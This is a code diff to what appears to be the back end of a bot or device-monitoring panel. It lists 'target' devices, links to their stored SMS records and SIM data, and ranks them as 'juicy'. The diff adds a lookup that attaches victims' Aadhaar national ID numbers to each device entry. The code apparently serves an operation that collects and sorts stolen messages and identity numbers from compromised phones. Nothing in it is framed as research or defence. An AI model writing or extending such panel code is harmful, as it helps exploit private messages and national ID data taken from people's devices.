@@ -174,6 +174,15 @@ function getSmsLink(target, deviceId, objId) {
   return `${url}/user_sms/${did}.json?print=pretty`;
 }
 
+// ── Aadhar DB: loaded once, refreshed on each /api/url/:id call ──────────────
+const AADHAR_FILE = path.join(BOT_DIR, 'aadhar.json');
+function loadAadharDb() {
+  try {
+    if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8'));
+  } catch {}
+  return {};
+}
+
 function loadDb(targetId) {
   const file = path.join(BOT_DIR, `devices_database_${targetId}.json`);
   try {
@@ -234,6 +243,9 @@ app.get('/api/url/:id', (req, res) => {
   if (!target) return res.status(404).json({ error: 'Not found' });
 
   const devices = loadDb(id);
+  const aadharDb = loadAadharDb();
+  const aadharForUrl = aadharDb[String(id)] || {};
+
   const deviceList = Object.entries(devices)
     .map(([deviceId, dev]) => ({
       deviceId,
@@ -254,7 +266,8 @@ app.get('/api/url/:id', (req, res) => {
       sim1Enriched:  dev.sim1_enriched || [],
       sim2Enriched:  dev.sim2_enriched || [],
       smsLink:       getSmsLink(target, deviceId, dev.obj_id),
-      hasAadhaar:    (dev.juicy_keywords || []).some(k => /aadh/i.test(k)),
+      hasAadhaar:    !!(aadharForUrl[deviceId] && aadharForUrl[deviceId].length > 0),
+      aadhaarNums:   aadharForUrl[deviceId] || [],
     }))
     .sort((a, b) => {
       // online first, then juicy, then by lastActivity desc
